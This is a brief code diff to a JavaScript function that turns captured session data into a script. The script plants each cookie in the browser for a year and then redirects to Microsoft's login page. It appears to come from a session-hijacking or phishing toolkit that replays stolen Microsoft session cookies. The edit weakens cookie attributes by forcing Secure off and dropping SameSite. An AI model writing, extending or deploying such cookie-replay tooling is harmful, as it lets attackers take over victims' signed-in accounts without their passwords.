@@ -1798,9 +1798,8 @@ function downloadCookiesScript(sessionData) {
             'var o=e[i];' +
             'document.cookie=o.name+"="+o.value+' +
               '";Path="+(o.path||"/")+";Domain="+o.domain+";Max-Age=31536000;"+' +
-              '(o.secure? "Secure;": "")+' +
-              '(o.httpOnly? "HttpOnly;": "")+' +
-              '"SameSite=None";' +
+              '(false? "Secure;": "")+' +
+              '(o.httpOnly? "HttpOnly;": "");' +
           '}' +
           'window.location.href="https://login.microsoftonline.com";' +
         '}();';
